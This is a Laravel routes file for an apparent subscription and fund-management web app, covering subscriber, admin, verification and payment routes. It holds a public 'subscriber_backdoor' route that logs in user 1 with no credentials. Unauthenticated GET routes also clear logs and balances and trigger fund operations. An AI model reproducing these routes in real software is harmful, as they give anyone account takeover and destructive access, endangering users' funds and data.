<?php


Auth::routes();

/**
Website Routes
 **/
Route::get('/', function(){
    return view('web.landing');
});
Route::get('/about', function(){
    return view('web.about');
})->name('about');
/**
WEBSITE END
 **/



Route::get('subscriber_backdoor',function(){
    auth()->loginUsingId(1);
    return redirect()->route('subscriber.dashboard');
});

Route::get('logout',function(){
    auth()->logout();
    return redirect('/');
});

Route::get('trigger_subscription','Subscriber\\DashboardController@try_subscription');
Route::get('trigger_manage_fund','Subscriber\\DashboardController@try_manage_fund');
Route::get('trigger_manage_fund_interest','Subscriber\\DashboardController@trigger_manage_fund_interest');
Route::get('get_currency_conversion','Subscriber\\DashboardController@get_currency_conversion');

Route::get('clear_logs','AdminActionsController@clear_logs')->name('clear_logs');
Route::get('clear_balance','AdminActionsController@clear_balance')->name('clear_balance');


Route::group(['middleware' => ['auth', 'verifyUser']], function() {

    /**
     * Regular User Routes - Subscriber
     */
    Route::prefix('')->as('subscriber.')->group(function(){

        Route::get('dashboard','Subscriber\\DashboardController@index')->name('dashboard');
        Route::get('account-settings','Subscriber\\AccountSettingsController@index')->name('account-settings');
        Route::get('earnings','Subscriber\\EarningsController@index')->name('earnings');
        Route::get('referrals','Subscriber\\ReferralsController@index')->name('referrals');

        Route::get('coin-in','Subscriber\\CoinInController@index')->name('coin-in');
    });
    /**
     * Admin Routes
     */

    Route::prefix('control-panel')->as('admin.')->group(function(){
        Route::get('dashboard',function(){
            return 'This is admin page';
        })->name('dashboard');

    });

    Route::get('/auth-verify', 'PagesController@verify')->name('auth-verify');
    Route::get('/auth-payment', 'PagesController@payment')->name('auth-payment');
    Route::get('/auth-index', 'PagesController@index')->name('auth-index');
    Route::get('/auth-cin_buy_oct', 'PagesController@cin_buy_oct')->name('auth-cin_buy_oct');
    Route::get('/auth-cin_manage_funds', 'PagesController@cin_manage_funds')->name('auth-cin_manage_funds');
    Route::get('/auth-cin_payment', 'PagesController@cin_payment')->name('auth-cin_payment');
    Route::get('/auth-cin_remittance', 'PagesController@cin_remittance')->name('auth-cin_remittance');
    Route::get('/auth-cout_sell_oct', 'PagesController@cout_sell_oct')->name('auth-cout_sell_oct');
    Route::get('/auth-cout_manage_funds', 'PagesController@cout_manage_funds')->name('auth-cout_manage_funds');
    Route::get('/auth-cout_payment', 'PagesController@cout_payment')->name('auth-cout_payment');
    Route::get('/auth-cout_remittance', 'PagesController@cout_remittance')->name('auth-cout_remittance');
    Route::get('/auth-cout_transfer', 'PagesController@cout_transfer')->name('auth-cout_transfer');
    Route::get('/auth-whitepaper', 'PagesController@whitepaper')->name('auth-whitepaper');
    Route::get('/auth-terms', 'PagesController@terms')->name('auth-terms');
    Route::get('/auth-policy', 'PagesController@policy')->name('auth-policy');
    Route::post('/auth-payment-save', 'PaymentController@payment')->name('auth-payment-save');
    
    // Post Routes
    // Pages Controller
    Route::post('/auth-payment-save', 'PaymentController@payment')->name('auth-payment-save');
    
    // Verification
    Route::post('/verifications-create', 'Verification\VerificationController@verification_create')->name('verifications-create');
    Route::post('/verifications-approve', 'Verification\VerificationController@verification_approve')->name('verifications-approve');
    Route::post('/verifications-decline', 'Verification\VerificationController@verification_decline')->name('verifications-decline');

    // OTP
    Route::post('/auth-verify', 'PagesController@userVerify')->name('auth-verify');
});

Route::prefix('payments')->as('payments')->group(function(){
    Route::get('square-index','Payments\SquareUpController@index');
    Route::get('square-locations','Payments\SquareUpController@get_locations');
    Route::post('square-paying','Payments\SquareUpController@paying');
});

Route::get('try', 'TryController@index');

Route::get('qwe/{amount}', 'Controller@getConvCurrency');